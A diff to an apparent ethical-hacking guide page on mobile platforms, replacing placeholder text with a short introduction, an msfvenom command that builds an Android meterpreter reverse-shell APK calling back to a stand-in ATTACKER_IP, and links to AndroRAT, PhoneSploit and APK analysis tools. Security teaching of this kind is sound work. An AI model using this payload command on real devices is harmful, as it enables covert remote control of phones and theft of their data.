@@ -1,13 +1,55 @@
 ---
 title: 📱 Hacking Mobile Platforms
-description: TBD
+description: Hacking mobile platforms involves exploiting vulnerabilities in mobile operating systems, applications, and networks.
 slug: guide/mobile
-sidebar:
-  order: 6
+head:
+  - tag: title
+    content: Hacking Mobile Platforms
 ---
 
-Ipsa illo quod rerum sed ut voluptas.
+import { LinkCard } from "@astrojs/starlight/components";
 
-Quidem voluptatem eos ut aliquam odio quis vel.
+Hacking mobile platforms involves exploiting vulnerabilities in mobile operating systems, applications, and networks.
 
-Architecto ab expedita accusantium est mollitia alias. Qui quaerat iusto optio facilis omnis ea.
+This can lead to unauthorized access, data breaches, and other security incidents.
+
+Mobile platforms are often less secure than traditional computing platforms, making them a common target for attackers.
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=ATTACKER_IP LPORT=4444 -o payload.apk
+```
+
+<LinkCard
+  title="AndroRAT"
+  description="AndroRAT is a remote access tool for Android devices that allows attackers to control and monitor the device remotely."
+  href="https://github.com/karma9874/AndroRAT"
+  target="_blank"
+/>
+
+<LinkCard
+  title="PhoneSploit"
+  description="PhoneSploit is a tool for exploiting vulnerabilities in Android devices."
+  href="https://github.com/AzeemIdrisi/PhoneSploit-Pro"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Android Application Analyzer"
+  description="Android Application Analyzer is a tool for analyzing Android applications for security vulnerabilities."
+  href="https://github.com/NotSoSecure/android_application_analyzer"
+  target="_blank"
+/>
+
+<LinkCard
+  title="Sixo Online APK Analyzer"
+  description="Sixo Online APK Analyzer is a web-based tool for analyzing Android apk files."
+  href="https://sisik.eu/apk-tool"
+  target="_blank"
+/>
+
+<LinkCard
+  title="QARK"
+  description="Tool to look for several security related Android application vulnerabilities"
+  href="https://github.com/linkedin/qark"
+  target="_blank"
+/>
